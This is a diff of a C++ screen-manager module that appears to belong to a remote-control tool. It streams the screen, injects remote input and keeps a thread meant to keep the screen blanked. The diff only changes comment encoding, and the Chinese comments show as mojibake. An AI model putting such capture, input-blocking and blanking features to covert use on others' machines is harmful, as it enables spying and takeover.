@@ -1,4 +1,4 @@
-// ScreenManager.cpp: implementation of the CScreenManager class.
+ï»¿// ScreenManager.cpp: implementation of the CScreenManager class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "stdafx.h"
@@ -45,9 +45,9 @@ void CScreenManager::ResetScreen(int biBitCount)
 
 	delete m_pScreenSpy;
 
-	if (biBitCount == 3)		// 4Î»»Ò¶È
+	if (biBitCount == 3)		// 4ä½ç°åº¦
 		m_pScreenSpy = new CScreenSpy(4, true);
-	else if (biBitCount == 7)	// 8Î»»Ò¶È
+	else if (biBitCount == 7)	// 8ä½ç°åº¦
 		m_pScreenSpy = new CScreenSpy(8, true);
 	else
 		m_pScreenSpy = new CScreenSpy(biBitCount);
@@ -71,7 +71,7 @@ void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
             break;
             
         //case COMMAND_NEXT:
-		//	// Í¨ÖªÄÚºËÔ¶³Ì¿ØÖÆ¶Ë¶Ô»°¿òÒÑ´ò¿ª£¬WaitForDialogOpen¿ÉÒÔ·µ»Ø
+		//	// é€šçŸ¥å†…æ ¸è¿œç¨‹æ§åˆ¶ç«¯å¯¹è¯æ¡†å·²æ‰“å¼€ï¼ŒWaitForDialogOpenå¯ä»¥è¿”å›
 		//	NotifyDialogIsOpen();
 		//	break;
 		//case COMMAND_SCREEN_RESET:
@@ -86,13 +86,13 @@ void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		//	break;
 		//case COMMAND_SCREEN_CONTROL:
 		//	{
-		//		// Ô¶³ÌÈÔÈ»¿ÉÒÔ²Ù×÷
+		//		// è¿œç¨‹ä»ç„¶å¯ä»¥æ“ä½œ
 		//		//BlockInput(false);
 		//		ProcessCommand(lpBuffer + 1, nSize - 1);
 		//		//BlockInput(m_bIsBlockInput);
 		//	}
 		//	break;
-		//case COMMAND_SCREEN_BLOCK_INPUT: //ControlThreadÀïËø¶¨
+		//case COMMAND_SCREEN_BLOCK_INPUT: //ControlThreadé‡Œé”å®š
 		//	m_bIsBlockInput = *(LPBYTE)&lpBuffer[1];
 		//	break;
 		//case COMMAND_SCREEN_BLANK:
@@ -173,12 +173,12 @@ DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
 	CScreenManager *pThis = (CScreenManager *)lparam;
 
 	pThis->sendBITMAPINFO();
-	// µÈ¿ØÖÆ¶Ë¶Ô»°¿ò´ò¿ª
+	// ç­‰æ§åˆ¶ç«¯å¯¹è¯æ¡†æ‰“å¼€
 
 	//pThis->WaitForDialogOpen();
 
 	pThis->sendFirstScreen();
-	try // ¿ØÖÆ¶ËÇ¿ÖÆ¹Ø±ÕÊ±»á³ö´í
+	try // æ§åˆ¶ç«¯å¼ºåˆ¶å…³é—­æ—¶ä¼šå‡ºé”™
     {
 		while (pThis->m_bIsWorking)
 			pThis->sendNextScreen();
@@ -187,19 +187,19 @@ DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
 	return 0;
 }
 
-// ´´½¨Õâ¸öÏß³ÌÖ÷ÒªÊÇÎªÁË±£³ÖÒ»Ö±ºÚÆÁ
+// åˆ›å»ºè¿™ä¸ªçº¿ç¨‹ä¸»è¦æ˜¯ä¸ºäº†ä¿æŒä¸€ç›´é»‘å±
 DWORD WINAPI CScreenManager::ControlThread(LPVOID lparam)
 {
 	static	bool bIsScreenBlanked = false;
 	CScreenManager *pThis = (CScreenManager *)lparam;
 	while (pThis->IsConnect())
 	{
-		// ¼Ó¿ì·´Ó¦ËÙ¶È
+		// åŠ å¿«ååº”é€Ÿåº¦
 		for (int i = 0; i < 100; i++)
 		{
 			if (pThis->IsConnect())
 			{
-				// ·Ö±æÂÊ´óĞ¡¸Ä±äÁË
+				// åˆ†è¾¨ç‡å¤§å°æ”¹å˜äº†
 				if (pThis->IsMetricsChange())
 					pThis->ResetScreen(pThis->GetCurrentPixelBits());
 				Sleep(10);
@@ -224,7 +224,7 @@ DWORD WINAPI CScreenManager::ControlThread(LPVOID lparam)
 		}
 		//BlockInput(pThis->m_bIsBlockInput);
 
-		// ·Ö±æÂÊ´óĞ¡¸Ä±äÁË
+		// åˆ†è¾¨ç‡å¤§å°æ”¹å˜äº†
 		if (pThis->IsMetricsChange())
 			pThis->ResetScreen(pThis->GetCurrentPixelBits());
 	}
@@ -235,16 +235,16 @@ DWORD WINAPI CScreenManager::ControlThread(LPVOID lparam)
 
 void CScreenManager::ProcessCommand( LPBYTE lpBuffer, UINT nSize )
 {
-	// Êı¾İ°ü²»ºÏ·¨
+	// æ•°æ®åŒ…ä¸åˆæ³•
 	if (nSize % sizeof(MSG) != 0)
 		return;
 
 	//SwitchInputDesktop();
 
-	// ÃüÁî¸öÊı
+	// å‘½ä»¤ä¸ªæ•°
 	int	nCount = nSize / sizeof(MSG);
 
-	// ´¦Àí¶à¸öÃüÁî
+	// å¤„ç†å¤šä¸ªå‘½ä»¤
 	for (int i = 0; i < nCount; i++)
 	{
 		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
@@ -356,7 +356,7 @@ void CScreenManager::SendLocalClipboard()
 }
 
 
-// ÆÁÄ»·Ö±æÂÊÊÇ·ñ·¢Éú¸Ä±ä
+// å±å¹•åˆ†è¾¨ç‡æ˜¯å¦å‘ç”Ÿæ”¹å˜
 bool CScreenManager::IsMetricsChange()
 {
 	LPBITMAPINFO	lpbmi =	m_pScreenSpy->getBI();
